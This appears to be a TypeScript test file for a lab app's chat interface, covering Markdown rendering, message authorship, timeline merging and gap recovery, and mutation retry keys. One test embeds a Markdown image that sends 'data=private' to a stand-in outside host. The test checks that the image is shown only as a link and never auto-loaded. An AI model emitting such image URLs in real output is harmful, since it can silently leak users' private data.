import { expect, test } from "bun:test";
import type { Message } from "@pico/lab/contracts";
import { renderToStaticMarkup } from "react-dom/server";
import { mutationIntent } from "@/web/api/mutation-intent";
import { Markdown } from "@/web/components/markdown";
import { ChatMessage } from "@/web/features/chat/message-list";
import {
  bridgeMessages,
  clearSubmittedDraft,
  hasHistoryGap,
  hasNewActivity,
  mergeMessages,
} from "@/web/features/chat/timeline";

const message = (id: string): Message => ({
  id,
  labId: "lab",
  conversationId: "chat",
  turnId: "turn",
  role: "assistant",
  content: id,
  createdAt: "2026-09-29T00:00:00Z",
});

test("untrusted Markdown images require a click and record links preserve code", () => {
  const id = "a12a617a-82e6-46ac-9d7b-cbf8060f902e";
  const html = renderToStaticMarkup(
    <Markdown
      links={{
        [id]: { href: "/labs/lab/experiments/example", title: "Result" },
      }}
    >{`![remote](https://outside.invalid/collect?data=private)\n\nResult ${id}\n\n\`${id}\`\n\n\`\`\`python\nx = "${id}"\n\`\`\``}</Markdown>,
  );
  expect(html).not.toMatch(/<(img|link)\b/);
  expect(html).toContain('href="https://outside.invalid/collect?data=private"');
  expect(html).toContain('href="/labs/lab/experiments/example"');
  expect(html).toContain(`<code>${id}</code>`);
});

test("automatic event messages retain laboratory authorship and closed tools defer bodies", () => {
  const event = renderToStaticMarkup(
    <ChatMessage
      entry={{
        ...message("event"),
        eventId: "done",
        role: "user",
        content: "completed",
      }}
    />,
  );
  expect(event).toContain("Laboratório");
  expect(event).not.toContain("Você");
  expect(event).toContain("message-system");
  const tool = renderToStaticMarkup(
    <ChatMessage
      entry={{
        ...message("tool"),
        toolCall: {
          id: "call",
          name: "read_file",
          arguments: {},
          result: { secretLargeBody: "not rendered yet" },
          status: "completed",
        },
      }}
    />,
  );
  expect(tool).toContain("read_file");
  expect(tool).not.toContain("secretLargeBody");
});

test("rolling conversation windows retain previously read history and update tool results", () => {
  const prior = Array.from({ length: 300 }, (_, i) => message(`${i}`));
  const incoming = Array.from({ length: 200 }, (_, i) => ({
    ...message(`${i + 250}`),
    content: "updated",
  }));
  const merged = mergeMessages(prior, incoming);
  expect(merged).toHaveLength(450);
  expect(merged[0]?.id).toBe("0");
  expect(merged[250]?.content).toBe("updated");
  expect(merged.at(-1)?.id).toBe("449");
  expect(mergeMessages(merged, [message("older")], true)[0]?.id).toBe("older");
  expect(clearSubmittedDraft("new direction", "old draft")).toBe(false);
  expect(clearSubmittedDraft("old draft", "old draft")).toBe(true);
});

test("returning to a hidden tab bridges more than 200 missed messages in server order", async () => {
  // Equal timestamps and non-lexical IDs ensure order comes from server pages.
  const all = Array.from({ length: 900 }, (_, index) => message(`m-${index}`));
  const prior = all.slice(0, 200);
  const latest = all.slice(-200);
  expect(hasHistoryGap(prior, latest)).toBe(true);
  expect(hasNewActivity(prior.at(-1)?.id, latest)).toBe(true);
  expect(hasNewActivity(latest.at(-1)?.id, latest)).toBe(false);
  const beforeIds: string[] = [];
  const complete = await bridgeMessages(prior, latest, async (before) => {
    beforeIds.push(before);
    const end = all.findIndex((item) => item.id === before);
    return all.slice(Math.max(0, end - 100), end);
  });
  expect(beforeIds).toEqual([
    "m-700",
    "m-600",
    "m-500",
    "m-400",
    "m-300",
    "m-200",
  ]);
  expect(complete.map((item) => item.id)).toEqual(all.map((item) => item.id));
  expect(prior).toHaveLength(200);
});

test("a failed gap fetch never returns a falsely joined timeline and a retry can recover", async () => {
  const all = Array.from({ length: 650 }, (_, index) =>
    message(`entry-${index}`),
  );
  const prior = all.slice(0, 200);
  const latest = all.slice(-200);
  let reads = 0;
  const page = async (before: string) => {
    const end = all.findIndex((item) => item.id === before);
    return all.slice(Math.max(0, end - 100), end);
  };
  await expect(
    bridgeMessages(prior, latest, async (before) => {
      if (++reads === 2) throw new Error("network interrupted");
      return page(before);
    }),
  ).rejects.toThrow("network interrupted");
  expect(prior.map((item) => item.id)).toEqual(
    all.slice(0, 200).map((item) => item.id),
  );
  expect(await bridgeMessages(prior, latest, page)).toEqual(all);
  await expect(bridgeMessages(prior, latest, async () => [])).rejects.toThrow(
    "HISTORY_GAP",
  );
  await expect(
    bridgeMessages(prior, latest, async () => latest),
  ).rejects.toThrow("HISTORY_GAP");
});

test("unacknowledged mutations keep an opaque retry identity across component remounts", async () => {
  const original = Object.getOwnPropertyDescriptor(
    globalThis,
    "sessionStorage",
  );
  const values = new Map<string, string>();
  Object.defineProperty(globalThis, "sessionStorage", {
    configurable: true,
    value: {
      getItem: (k: string) => values.get(k) ?? null,
      setItem: (k: string, v: string) => values.set(k, v),
      removeItem: (k: string) => values.delete(k),
    },
  });
  try {
    const first = await mutationIntent("sensitive study payload");
    const retry = await mutationIntent("sensitive study payload");
    expect(retry.key).toBe(first.key);
    expect(JSON.stringify([...values])).not.toContain("sensitive");
    retry.complete();
    expect((await mutationIntent("sensitive study payload")).key).not.toBe(
      first.key,
    );
  } finally {
    if (original) Object.defineProperty(globalThis, "sessionStorage", original);
    else Reflect.deleteProperty(globalThis, "sessionStorage");
  }
});
